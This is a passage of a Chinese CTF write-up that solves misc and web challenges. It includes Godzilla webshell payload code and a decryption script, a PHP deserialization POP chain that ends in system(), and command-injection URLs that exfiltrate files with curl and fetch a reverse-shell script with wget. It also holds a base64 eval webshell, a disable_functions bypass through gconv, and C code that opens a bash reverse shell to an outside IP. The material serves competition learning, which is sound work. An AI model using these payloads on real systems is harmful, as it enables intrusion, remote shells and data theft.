    $execSql=get("execSql");
    function  mysql_exec($host,$port,$username,$password,$execType,$sql){
        // 创建连接
        $conn = new mysqli($host,$username,$password,"",$port);
        // Check connection
        if ($conn->connect_error) {
            return $conn->connect_error;
        }

        $result = $conn->query($sql);
        if ($conn->error){
            return $conn->error;
        }
        $result = $conn->query($sql);
        if ($execType=="update"){
            return "Query OK, "+$conn->affected_rows+" rows affected";
        }else{
            $data="ok\n";
            while ($column = $result->fetch_field()){
                $data.=base64_encode($column->name)."\t";
            }
            $data.="\n";
            if ($result->num_rows > 0) {
                // 输出数据
                while($row = $result->fetch_assoc()) {
                    foreach ($row as $value){
                        $data.=base64_encode($value)."\t";
                    }
                    $data.="\n";
                }
            }
            return $data;
        }
    }
    function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql){
        try {
            $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password);

            // 设置 PDO 错误模式为异常
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if ($execType=="update"){
                return "Query OK, "+$conn->exec($sql)+" rows affected";
            }else{
                $data="ok\n";
                $stm=$conn->prepare($sql);
                $stm->execute();
                $row=$stm->fetch(PDO::FETCH_ASSOC);
                $_row="\n";
                foreach (array_keys($row) as $key){
                    $data.=base64_encode($key)."\t";
                    $_row.=base64_encode($row[$key])."\t";
                }
                $data.=$_row."\n";
                while ($row=$stm->fetch(PDO::FETCH_ASSOC)){
                    foreach (array_keys($row) as $key){
                        $data.=base64_encode($row[$key])."\t";
                    }
                    $data.="\n";
                }
                return $data;
            }

        }
        catch(PDOException $e)
        {
            return $e->getMessage();
        }
    }
    if ($dbType=="mysql"){
        if (extension_loaded("mysqli")){
            return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else if (extension_loaded("pdo")){
            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else{
            return "no extension";
        }
    }else if (extension_loaded("pdo")){
        return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
    }else{
        return "no extension";
    }
    return "no extension";

}
function base64Encode($data){
    return base64_encode($data);
}
function test(){
    return "ok";
}
function get($key){
    global $parameters;
    if (isset($parameters[$key])){
        return $parameters[$key];
    }else{
        return null;
    }
}
function getAllParameters(){
    global $parameters;
    return $parameters;
}
function includeCode(){
    $classCode=get("binCode");
    $codeName=get("codeName");
    $_SES=&getSession();
    $_SES[$codeName]=$classCode;
    return "ok";
}
function base64Decode($string){
    return base64_decode($string);
}
function convertFilePermissions($fileAttr){
    $mod=0;
    if (strpos($fileAttr,'R')!==false){
        $mod=$mod+0444;
    }
    if (strpos($fileAttr,'W')!==false){
        $mod=$mod+0222;
    }
    if (strpos($fileAttr,'X')!==false){
        $mod=$mod+0111;
    }
    return $mod;
}
function close(){
    @session_start();
    $_SES=&getSession();
    $_SES=null;
    if (@session_destroy()){
        return "ok";
    }else{
        return "fail!";
    }
}

function bigFileDownload(){
    $mode=get("mode");
    $fileName=get("fileName");
    $readByteNum=get("readByteNum");
    $position=get("position");
    if ($mode=="fileSize"){
        if (@is_readable($fileName)){
            return @filesize($fileName)."";
        }else{
            return "not read";
        }
    }elseif ($mode=="read"){

        if (function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){
            $handle=fopen($fileName,"ab+");
            fseek($handle,$position);
            $data=fread($handle,$readByteNum);
            @fclose($handle);
            if ($data!==false){
                return $data;
            }else{
                return "cannot read file";
            }
        }else if (function_existsEx("file_get_contents")){
            return file_get_contents($fileName,false,null,$position,$readByteNum);
        }else{
            return "no function";
        }

    }else{
        return "no mode";
    }
}

function bigFileUpload(){
    $fileName=get("fileName");
    $fileContents=get("fileContents");
    $position=get("position");
    if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){
        $handle=fopen($fileName,"ab+");
        if ($handle!==false){
            fseek($handle,$position);
            $len=fwrite($handle,$fileContents);
            if ($len!==false){
                return "ok";
            }else{
                return "cannot write file";
            }
            @fclose($handle);
        }else{
            return "cannot open file";
        }
    }else if (function_existsEx("file_put_contents")){
        if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){
            return "ok";
        }else{
            return "writer fail";
        }
    }else{
        return "no function";
    }
}
function canCallGzipEncode(){
    if (function_existsEx("gzencode")){
        return "1";
    }else{
        return "0";
    }
}
function canCallGzipDecode(){
    if (function_existsEx("gzdecode")){
        return "1";
    }else{
        return "0";
    }
}
function bytesToInteger($bytes, $position) {
    $val = 0;
    $val = $bytes[$position + 3] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 2] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position + 1] & 0xff;
    $val <<= 8;
    $val |= $bytes[$position] & 0xff;
    return $val;
}
function isGzipStream($bin){
    if (strlen($bin)>=2){
        $bin=substr($bin,0,2);
        $strInfo = @unpack("C2chars", $bin);
        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
        switch ($typeCode) {
            case 31139:
                return true;
                break;
            default:
                return false;
        }
    }else{
        return false;
    }
}
function getBytes($string) {
    $bytes = array();
    for($i = 0; $i < strlen($string); $i++){
        array_push($bytes,ord($string[$i]));
    }
    return $bytes;
}
```

这里先执行了gzencode，所以最后return的result和哥斯拉直接解密的result是不一样的，也就会导致后续的流量跟常规的哥斯拉不同，解密就加一个gzdecode就行了

![image-20220331160139101](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bb12580e5a3cc216127c5797935eeb53bdaae6cb.png)

一个一个找，找到这里

![image-20220331160912228](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4c0c23e828fcad34b878958a748be9e8522c1db7.png)

![image-20220331160837250](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c811db9a93c36c4236a560a61b21994b7319025a.png)

解密

```php
<?php

function encode($D,$K){
    for($i=0;$i<strlen($D);$i++){
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='pass';
$payloadName='payload';
$key='093c1c388069b7e1';
$data = 'JrhrMWMzODgwNnKp+yzEe/V+BmMGU1joHxkWZdbHzcwrzoftAY7cxGzLbZ/z8e38Bc7XradHhZL8tA3CudX1rOtnxaYjHjnm/Bobbrsl57NE9kJv7pW1HnCAP3JEZQBodnom+Oa9VxHxsQvwe+eHxRGsDsgXX/kE342APGVWZM51C80lwh+VYUoRSCt0GVFH7swmrIR5sydtIjeSUQGDV/lW1TtgNxB4Wa50Pmd0dzYwtSw/IdhvYu9WvbPVSfNjeEfjBkgofDUTdS3yMQRItrv3gdORz5ostfpb5+txYj3Oz/ebr6+kfEWz1bZ9KLfs7aHvzXdDaEkx465004EWloEyoDNjt1ohhnQ4Yjc=';
$decode = encode(base64_decode($data),$key);
echo base64_encode(gzdecode($decode));
```

![image-20220331161101511](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3564f67f0942addddebc10e4e592e7b24546ef65.png)

再解一个base64就行了，可以看到有个flag.txt

![image-20220331161226858](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1db2f35b2cc83b17377851e6fd35513b0397743e.png)

写进winhex，然后binwalk提一下

![image-20220331161421410](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e3d6cba37eace1d2d4da3aac277dd7370f041fb7.png)

需要密码

![image-20220331161644730](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6d14be8891143bb69ac51d7044a5d663a09d3471.png)

结合上面的key is key1***，以及注释中的password is md5(Godzilla' key)，根据$key='093c1c388069b7e1';因为哥斯拉是`(key1***)`的md5的前16位作为秘钥，秘钥也就是`093c1c388069b7e1`，我们可以根据这个爆破

```python
import hashlib

l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
for i in l:
    for j in l:
        for k in l:
            f = 'key1' + i + j + k
            md5 =  hashlib.md5(f.encode(encoding='UTF-8')).hexdigest()
            if md5[:16] == '093c1c388069b7e1':
                print(f)
                print(md5)
```

得到key为key1sme，md5为`093c1c388069b7e18bb4e898fc5ee049`

解压得到flag：`DASCTF{7d1ef2e35d01942317131fdad088bf5b}`

书鱼的秘密
-----

一个奇怪的提示，233，他的16进制是e9

![image-20220401081235396](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-713256407f3a884e2d909d2197bb05663876d8b6.png)

因此全局搜e9

![image-20220401081143498](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2739601d8b2057653a7ce15a7e1808e7da553fdd.png)

比赛的时候，想着如果是插入了数据，音频本身怎么可能会正常播放，然后就没往这边想，赛后才知道，因为音频的特殊性，每隔10个字节将该字节改为任意字节，对音频的音质都不会有大的的影响

赛后看wp可以发现，每个之间都间隔了10个字节

可以看到是从这里开始每隔十个字节更改数据的，这里是第118个字节

![image-20220401084959443](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-097be2764d3cd2c03250366ecc7fd1a714418f93.png)

```python
f = open('书鱼的多重文件.wav','rb').read()[118:]
data = bytearray()

for i in range(len(f)//10):
    data += (f[i*10]^233).to_bytes(1,byteorder='little')

fs = open('out1.png','wb')
fs.write(data[::-1])
fs.close()
```

![image-20220401085041535](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-004b605560f343b04e1aca3b61a2ad2867792710.png)

![image-20220401085226232](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-661befc8a2db3166bc14f83d66905a22dcc4f40b.png)

B通道有东西

![image-20220401085403750](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8bd735dab755e0156a637420f41481d9fad3f652.png)

是个压缩包

![image-20220401085433741](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-87414c76a2025baef0cab69fe8fd8100eff7b2c5.png)

提出压缩包，winrar自动修复一下，得到一个Markdown文件

![image-20220401085813377](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b4feacc78e7c6626c310f16a7444235240cb8290.png)

```php
226232  1       
23442647826 1
528842  3
5893626874  3
46342   2
6443742 1
473323  2
24462   1-2
6626    2
35426884    3
3782867425 484632   2
2654842    3  
2376832    0-3
52726      1 
```

`https://www.chenweiliang.com/cwl-1354.html`

这里要神奇的将数字，用九键对应成国家的英文，具体怎么把九键一个键的三个字母精确到一个字母，我猜是要猜

对应完之后在将国家对应出区号，得到

```php
canada 1 -1
afghanistan 1 -93
latvia 3 -371
luxembourg 3 -352
india 2 -91
nigeria 1 -234
greece 2 -30
china 1-2 -86
oman 2 -968
djibouti 3 -253
equatorial guinea 2 -240
bolivia 3 -591
beermuda 0-3 -440
japan 1 -81
```

然后中间那一列指的是取后面区号的第几位，比如第二个是取93的第一位，就是取9

这样可以得到

```php
1912120866341-4408
```

然后后面加个空格在md5得到flag

`DASCTF{b80ddea112953c5f56fad46758d21ba8}`

xxxxxx
------

开局一个图一个脚本

```python
xxxxxxx = cv2.imread('xxxxxxx.bmp', 0)
xxxxxxxx = cv2.imread('xxxxxxxx.bmp', 0)
xxxxxxxxx, xxxxxxxxxx = xxxxxxx.shape
xxxxxxxxxxx = int(xxxxxxxxx/8)
xxxxxxxxxxxx = int(xxxxxxxxxx/8)
fingernum = xxxxxxxx.shape[0] * xxxxxxxx.shape[1]
r = math.ceil(fingernum/(xxxxxxxxxxx*xxxxxxxxxxxx))
xxxxxxx = np.float32(xxxxxxx)

xxxxxxxxxxxxx = xxxxxxx

for i in range(xxxxxxxxxxx):
    for j in range(xxxxxxxxxxxx):
        xxxxxxxxxxxxxxx = cv2.dct(xxxxxxx[8*i:8*i+8, 8*j:8*j+8])
        for t in range(r):
            rx, ry = 4, 4
            r1 = xxxxxxxxxxxxxxx[rx, ry]
            r2 = xxxxxxxxxxxxxxx[7-rx, 7-ry]
            detat=abs(r1-r2)
            xxxxxxxxxxxxxx = float(detat + 100)
            if xxxxxxxx[i][j] == 0:
                if r1 <= r2:
                    xxxxxxxxxxxxxxx[rx, ry] += xxxxxxxxxxxxxx
            if xxxxxxxx[i][j] == 255:
                if r1 >= r2:
                    xxxxxxxxxxxxxxx[7-rx, 7-ry] += xxxxxxxxxxxxxx
        xxxxxxxxxxxxx[8*i:8*i+8, 8*j:8*j+8] = cv2.idct(xxxxxxxxxxxxxxx)
cv2.imwrite("xxxxxx.bmp", xxxxxxxxxxxxx)
```

是个混淆了的DCT变换，`https://blog.csdn.net/wsp_1138886114/article/details/116996220`

根据这个链接先反混淆一下

```python
import cv2,math
import numpy as np

img = cv2.imread('xxxxxxx.bmp', 0)
flag = cv2.imread('xxxxxxxx.bmp', 0)
height, width = img.shape
block_y = int(height/8)
block_x = int(width/8)
fingernum = flag.shape[0] * flag.shape[1]
r = math.ceil(fingernum/(block_y*block_x))#返回大于等于参数fingernum/(x*y)的最小整数
img = np.float32(img)#转换数据类型

new_img = img

for h in range(block_y):
    for w in range(block_x):
        data_dct = cv2.dct(img[8*h:8*h+8, 8*w:8*w+8])
        for t in range(r):
            rx, ry = 4, 4
            r1 = data_dct[rx, ry]#可以知道8格一块然后修改dct的3和4处数据
            r2 = data_dct[7-rx, 7-ry]
            detat=abs(r1-r2)#绝对值
            tmp = float(detat + 100)
            if flag[h][w] == 0:
                if r1 <= r2:#比较两边大小
                    data_dct[rx, ry] += tmp
            if flag[h][w] == 255:
                if r1 >= r2:
                    data_dct[7-rx, 7-ry] += tmp
        new_img[8*h:8*h+8, 8*w:8*w+8] = cv2.idct(data_dct)
cv2.imwrite("xxxxxx.bmp", new_img)
```

写解密脚本

```python
import cv2,math
import numpy as np
from Crypto.Util import number

img = cv2.imread('xxxxxx.bmp', 0)
height, width = img.shape
block_y = int(height/8)
block_x = int(width/8)
img = np.float32(img)

res = ''
for h in range(block_y):
    for w in range(block_x):
        data_dct = cv2.dct(img[8*h:8*h+8, 8*w:8*w+8])
        rx, ry = 4, 4
        r1 = data_dct[rx, ry]
        r2 = data_dct[7-rx, 7-ry]
        if r1 > r2:
            res += '0'
        else:
            res += '1'
print(res)
# from PIL import Image
# MAX = 64
# pic = Image.new("RGB",(MAX, MAX))
# i=0
# for y in range (0,MAX):
#     for x in range (0,MAX):
#         if(res[i] == '1'):
#             pic.putpixel([x,y],(0, 0, 0))
#         else:
#             pic.putpixel([x,y],(255,255,255))
#         i = i+1
# pic.show()
```

flag图像黑白相间，查看间隔大小猜测是asc码，第一开始一共是101个0，对应e

![image-20220401103408859](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9a074f789d47ef71c3d4a53e8383e986db216ccc.png)

```python
import cv2,math
from Crypto.Util import number
res = '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000011111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000001111111111111111111111111111111111111111111111111110000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111111110000000000111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'
a=[]
for i in range(len(res)-1):
    if res[i] != res[i+1]:
        a.append(i+1)
print(a)
flag = 'e'
for m in range(len(a)-1):
    flag += chr(a[m+1]-a[m])
print(flag)
#[101, 151, 204, 302, 402, 459, 509, 558, 610, 659, 757, 858, 915, 967, 1020, 1119, 1221, 1320, 1420, 1520, 1569, 1668, 1722, 1775, 1873, 1971, 2020, 2118, 2175, 2226, 2281, 2334, 2344]
#e25bd92141be945cfcdd1c65bb1b9375
```

![image-20220401105440051](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-069c42fa411680f4b797d164038e6870303f48e4.png)

0x02 WEB
========

ezpop
-----

```php
<?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }

}

if (isset($_POST['cmd'])) {
    unserialize($_POST['cmd']);
} else {
    highlight_file(__FILE__);
}
```

```php
fin::__destruct
↓↓↓ 对象被当做一个字符串使用时调用，触发__toString
what::__toString
↓↓↓
mix::run
↓↓↓ 对象当作函数，触发__invoke
crow::__invoke
↓↓↓ __invoke的world不存在，触发__call
fin::__call
↓↓↓
mix::get_flag
```

exp：

```php
<?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)(); 
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    { 
        ($this->m1)();
    } 

    public function get_flag()
    {
        eval('#' . $this->m1);  //"/r"绕过注释 代码执行
    }

}

$o = new fin();
$o->f1 = new what();
$o->f1->a = new mix();
$o->f1->a->m1 = new crow();
$o->f1->a->m1->v1 = new fin();
$o->f1->a->m1->v1->f1 = new mix();
$o->f1->a->m1->v1->f1->m1="\r\nsystem('ls /');";

echo(urlencode(serialize($o)));
```

![image-20220401143600616](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7b356921dc49024f7720e3ece19fac259a5c1e64.png)

calc
----

源码：

```python
#coding=utf-8
from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
import random
from urllib import parse
import os
from werkzeug.utils import secure_filename
import time

app=Flask(__name__)

def waf(s):
    blacklist = ['import','(',')',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
            break
    return flag

@app.route("/")
def index():
    "欢迎来到SUctf2022"
    return render_template("index.html")

@app.route("/calc",methods=['GET'])
def calc():
    ip = request.remote_addr
    num = request.values.get("num")
    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)

    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return "waf!!"

if __name__ == "__main__":
    app.run(host='0.0.0.0',port=5000)  
```

有两个命令执行点

![image-20220401144017632](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-404dfe61b51f6ce3f8633fe7d8949be6fa5613e4.png)

### 解法一：

并没有过滤反引号，Linux中反引号是可以执行命令的，这里就可以直接利用，但是这样在`eval`中就会报错，导致不会执行`os.system`，我们可以用#注释

```php
http://af3fcb87-be75-4fa0-93d0-afbb3a6245dd.node4.buuoj.cn:81/calc?num=123%23`curl%09114.215.25.168:2333`
```

![image-20220401144652201](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8120b77005897f11c1dc07415f3ba5d262f77de5.png)

参考：`https://www.anquanke.com/post/id/98896`学一下curl的花式用法

执行ls /，他会把命令执行日志留在log里

```php
http://af3fcb87-be75-4fa0-93d0-afbb3a6245dd.node4.buuoj.cn:81/calc?num=123%23`ls%09/`
```

读一下log

```php
http://af3fcb87-be75-4fa0-93d0-afbb3a6245dd.node4.buuoj.cn:81/calc?num=123%23`curl%09-T%09/tmp/log.txt%09114.215.25.168:2333`
```

![image-20220401145827332](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b51b019d027c590fb179726f698bb6648bc7853e.png)

之后cat flag即可

### 解法二：

利用wget执下载一个反弹shell的sh文件然后执行

```php
/calc?num=9*9%23`wget%09-P%09/tmp%09http://114.215.25.168/mon.sh`  #写入
/calc?num=7*7%23`chmod%09777%09/tmp/mon.sh`
/calc?num=7*7%23`/tmp/mon.sh`
```

![image-20220401150539381](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ad68bd129d95b2d080cbc50a44c6e749659c039d.png)

upgdstore
---------

可以直接传phpinfo，禁用了一堆

![image-20220401151539316](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-30b7ac14dd306129781b53d5aee6b3c21725f853.png)

使用拼接的方法读源码

```php
<?php echo ('fil'.'e_get_contents')('/var/www/html/index.php');
```

```php
<?php
function fun($var): bool{
    $blacklist = ["\$_", "eval","copy" ,"assert","usort","include", "require", "$", "^", "~", "-", "%", "*","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close", "proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport", "syslog","popen","show_source","highlight_file","`","chmod"];

    foreach($blacklist as $blackword){
        if(strstr($var, $blackword)) return True;
    }

    return False;
}
error_reporting(0);
//设置上传目录
define("UPLOAD_PATH", "./uploads");
$msg = "Upload Success!";
if (isset($_POST['submit'])) {
$temp_file = $_FILES['upload_file']['tmp_name'];
$file_name = $_FILES['upload_file']['name'];
$ext = pathinfo($file_name,PATHINFO_EXTENSION);
if(!preg_match("/php/i", strtolower($ext))){
die("只要好看的php");
}

$content = file_get_contents($temp_file);
if(fun($content)){
    die("诶，被我发现了吧");
}
$new_file_name = md5($file_name).".".$ext;
        $img_path = UPLOAD_PATH . '/' . $new_file_name;

        if (move_uploaded_file($temp_file, $img_path)){
            $is_upload = true;
        } else {
            $msg = 'Upload Failed!';
            die();
        }
        echo '<div style="color:#F00">
```

接下来又有两个思路，一个是利用继承，重写一个类，把动态方法调用变成静态方法，第二个是base64进行修饰绕过

### 绕过过滤方法一：

上传两个php文件

上传一个php文件，内容为`PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+`(base64后一句话木马)

![image-20220401154601468](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bec75f08e32f1263627c122408a0e8c43ff71627.png)

再上传一个利用include+伪协议的方法绕过

这里利用大小写绕过strstr，解码后是`php://filter/convert.base64-decode/resource=2b8b8e5570101ff79e9f1bb2967a0833.php`

```php
<?php Include(base64_decode("cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0xMS5waHA="));?>
```

![image-20220401154334823](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-59243b3831811968ca8af2f153fa8e80c451d5f0.png)

### 绕过过滤方法二：

利用继承重写一个类，把动态方法调用变成静态方法，这样就能写shell了

```php
<?php
define("EV", "eva"."l");
define("GETCONT", "fil"."e_get_contents");
// 由于禁止了$，我们只能从已有的地方获取$符
define("D",(GETCONT)('/var/www/html/index.php')[353]);
define("SHELL","<?php ".EV."(".D."_POST['a']);");
echo (GETCONT)('./shell.php');

class splf extends SplFileObject {

    public function __destruct() {
        parent::fwrite(SHELL);
    }
}

define("PHARA", new splf('shell.php','w'));
```

![image-20220401171716469](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2ca6a450ad014298d0be4be8f8dc0ff7d29464fa.png)

### 上传方法一：用 SplFileObject 写

能执行命令之后，又有好几种方法上传文件来bypass disable\_functions，这里可以通过上传`exp.so`和`gconv-modules`来bypass disable\_functions，也可以用LD\_PRELOAD来bypass

exp.c:

```c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  puts("pwned");
  system("bash -c 'bash -i >& /dev/tcp/114.215.25.168/2333 0>&1'");
  exit(0);
}
```

编译后扔自己服务器上:`gcc 1.c -o payload.so -shared -fPIC`

![image-20220401165201358](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2015dde447800db81c4baf76b378a23bd8ee3483.png)

```php
POST /uploads/91328b287f98a67d167d523d453e4451.php HTTP/1.1
Host: b4e6bb5a-3d67-4de7-9360-a325de302310.node4.buuoj.cn:81
Content-Length: 227
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://b4e6bb5a-3d67-4de7-9360-a325de302310.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://b4e6bb5a-3d67-4de7-9360-a325de302310.node4.buuoj.cn:81/uploads/91328b287f98a67d167d523d453e4451.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: OUTFOX_SEARCH_USER_ID_NCOO=2063489418.517967; UM_distinctid=17ee2cd83fda5e-0ab95a53d98578-f791b31-144000-17ee2cd83feaf5
Connection: close

1=
$url = "http://mon0dy.top/gconv-modules";

$file1 = new SplFileObject($url,'r');
$a="";
while(!$file1->eof())
{
    $a=$a.$file1->fgets();
}
$file2 = new SplFileObject('/tmp/gconv-modules','w');
$file2->fwrite($a);
```

![image-20220401165317585](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4ecb240a1d1d0b724e1e57a5520cde76caa8f8e2.png)

```php
http://b4e6bb5a-3d67-4de7-9360-a325de302310.node4.buuoj.cn:81/uploads/91328b287f98a67d167d523d453e4451.php

POST:1=putenv("GCONV_PATH=/tmp/");show_source("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so"); 
```

![image-20220401165309070](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-df8f03cfaad0dc3ecac2b7828ef3beba8c8cc882.png)

```php
find / -user root -perm -4000 -print 2>/dev/null
find /bin -perm -u=s -type f 2>/dev/null
find /usr -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

![image-20220401165447920](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5d1255e7f49de72797ede9f5a1cb1b8cdc3d58f1.png)

发现有个nl

![image-20220401165424097](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-209afaeb757aa5e14742c02b78a33741a6870ee5.png)

### 上传方法二：利用 ftp 进行写

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()

authorizer.add_anonymous("./")

handler = FTPHandler
handler.authorizer = authorizer

handler.masquerade_address = "xxx"
# 注意要用被动模式
handler.passive_ports = range(2333,2335 )

server = FTPServer(("0.0.0.0", 21), handler)
server.serve_forever()
```

```php
$local_file = '/tmp/payload.so';
$server_file = 'hack.so';
$ftp_server = 'xxxxx';
$ftp_port=21;

$ftp = ftp_connect($ftp_server,$ftp_port);

$login_result = ftp_login($ftp, 'anonymous', '');
// 注意要开启被动模式
ftp_pasv($ftp,1);

if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) {
    echo "Successfully written to $local_file\n";
} else {
    echo "There was a problem\n";
}

ftp_close($ftp);
```